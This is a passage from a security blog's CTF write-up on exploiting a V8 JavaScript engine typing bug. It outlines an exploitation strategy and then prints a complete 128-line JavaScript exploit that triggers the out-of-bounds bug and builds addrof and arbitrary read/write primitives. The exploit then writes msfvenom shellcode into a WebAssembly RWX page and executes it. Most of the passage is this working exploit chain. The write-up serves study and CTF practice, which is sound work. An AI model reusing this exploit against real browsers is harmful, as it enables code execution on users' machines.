</span></span><span class="line"><span class="cl">	  <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After succesfully escaping <code>NaN</code> typing abusing <code>NumberAbs</code>, the vulnerability can be triggered enabling us to create an Array with OOB indexed property access.</p>
<h3 id="exploitation-1">Exploitation</h3>
<p>Now that we have OOB access, the exploit strategy is simple. We need an <code>addrof</code> primitive to obtain the address of arbitrary objects, and in this case, we can neglect the creation of a <code>fakeobj</code> primitive in order to create objects at arbitrary memory locations.
This is due to the fact that since we have a large enough OOB read/write primitive, it can be trivially converted into an arbitrary read/write primitive. In order to achieve successful exploitation we follow the following steps:</p>
<ol>
<li>First we allocate two arrays, an unboxed and a boxed array. These arrays should be declared after the OOB array so that they are consecutively allocated in V8&rsquo;s heap with respect to our OOB array, in order to access their contents through our OOB array.</li>
<li>We leak the map tagged pointers of both the boxed and unboxed array accordingly.</li>
<li>Leveraging the leaked maps, we construct an <code>addrof</code> primitive enabling type confusion of the unboxed array elements by changing the unboxed array map accordingly.</li>
<li>Construct arbitrary read/write primitives by overwriting the unboxed array&rsquo;s elements pointer (taking care of V8&rsquo;s pointer compression).</li>
<li>Instantiate a WASM instance, leak its RWX page and write the contents of arbitrary code to it to then pivot control flow of execution.</li>
</ol>
<h3 id="full-exploit">Full Exploit</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">	    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">	    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>              
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mh">0x10000</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">trigger</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">oob_arr</span> <span class="o">=</span> <span class="nx">trigger</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">flt_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[{},</span> <span class="p">{}];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">flt_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob_arr</span><span class="p">[</span><span class="mi">5</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">obj_map</span> <span class="o">=</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">oob_arr</span><span class="p">[</span><span class="mi">13</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">obj_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">flt_map</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">old_elements</span> <span class="o">=</span> <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mi">2</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">leak</span> <span class="o">=</span> <span class="nx">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">old_elements</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">leak</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">let</span> <span class="nx">old_elements</span> <span class="o">=</span> <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">((</span><span class="mi">2</span><span class="nx">n</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">)</span> <span class="o">+</span> <span class="nx">addr</span> <span class="o">-</span> <span class="mi">8</span><span class="nx">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">flt_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">oob_arr</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="nx">old_elements</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">exploit</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_code</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Uint8Array</span><span class="p">([</span>
</span></span><span class="line"><span class="cl">		<span class="mi">0</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">115</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">133</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">96</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">1</span><span class="p">,</span><span class="mi">127</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">130</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">112</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">131</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">129</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">145</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">111</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">121</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">109</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">105</span><span class="p">,</span><span class="mi">110</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">138</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">		<span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">132</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">128</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">65</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">11</span>
</span></span><span class="line"><span class="cl">	<span class="p">]);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_mod</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Module</span><span class="p">(</span><span class="nx">wasm_code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_instance</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebAssembly</span><span class="p">.</span><span class="nx">Instance</span><span class="p">(</span><span class="nx">wasm_mod</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="nx">wasm_instance</span><span class="p">.</span><span class="nx">exports</span><span class="p">.</span><span class="nx">main</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">wasm_instance_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">wasm_instance</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x68</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">rwx_page_addr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">wasm_instance_addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="kd">function</span> <span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ArrayBuffer</span><span class="p">(</span><span class="mh">0x100</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x14</span><span class="nx">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="nx">arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">		<span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">shellcode</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">			<span class="nx">dataview</span><span class="p">.</span><span class="nx">setUint32</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="nx">i</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">[</span><span class="nx">i</span><span class="p">],</span> <span class="kc">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	<span class="c1">// msfvenom -p linux/x64/exec CMD=&#39;xcalc&#39; --format dword
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">shellcode</span><span class="o">=</span><span class="p">[</span>                 
</span></span><span class="line"><span class="cl">	    <span class="mh">0x90909090</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x90909090</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x782fb848</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x636c6163</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x48500000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x73752fb8</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x69622f72</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x8948506e</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0xc03148e7</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x89485750</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0xd23148e6</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x3ac0c748</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x50000030</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x4944b848</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x414c5053</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x48503d59</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x3148e289</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x485250c0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0xc748e289</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x00003bc0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">	    <span class="mh">0x050f00</span>
</span></span><span class="line"><span class="cl">	<span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">f</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">exploit</span><span class="p">();</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div style="text-align:center">
<img src="/2021-12-25-112106_948x623_scrot.png"/>
</div>

    </div>

    <div class="post-copyright">
  <p class="copyright-item">
    <span class="item-title">Author</span>
    <span class="item-content">ulexec</span>
  </p>
  <p class="copyright-item">
    <span class="item-title">LastMod</span>
    <span class="item-content">
        2021-04-09
        
    </span>
  </p>
  
  
</div>
<footer class="post-footer">
      <div class="post-tags">
          <a href="/tags/pwn/">pwn</a>
          <a href="/tags/ctf/">ctf</a>
          <a href="/tags/chrome/">chrome</a>
          </div>
      <nav class="post-nav">
        <a class="prev" href="/post/2021-05-20-startctf2019_oobv8/">
            <i class="iconfont icon-left"></i>
            <span class="prev-text nav-default">*CTF 2019 - oob-v8</span>
            <span class="prev-text nav-mobile">Prev</span>
          </a>
        <a class="next" href="/post/2021-04-08-shelfloading/">
            <span class="next-text nav-default">SHELF Loading</span>
            <span class="next-text nav-mobile">Next</span>
            <i class="iconfont icon-right"></i>
          </a>
      </nav>
    </footer>
  </article>
        </div>
        

  

  

      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="social-links">
      <a href="ulexecve@protonmail.com" class="iconfont icon-email" title="email"></a>
      <a href="https://twitter.com/ulexec" class="iconfont icon-twitter" title="twitter"></a>
      <a href="https://linkedin.com/in/ignacio-sanmillan-1aa244b8" class="iconfont icon-linkedin" title="linkedin"></a>
      <a href="https://github.com/ulexec" class="iconfont icon-github" title="github"></a>
  <a href="http://ulexec.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
</div>

<div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
  </span>

  

  <span class="copyright-year">
    &copy; 
    2017 - 
    2022<span class="heart"><i class="iconfont icon-heart"></i></span><span>ulexec</span>
  </span>
</div>

    </footer>

    <div class="back-to-top" id="back-to-top">
      <i class="iconfont icon-up"></i>
    </div>
  </div>
  
  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>



<script type="text/javascript" src="/js/main.min.4ae89da218555efa0e7093a20b92017d2e1202b66fff9fc2edf4cb8d44b44c6e.js"></script>








</body>
</html>
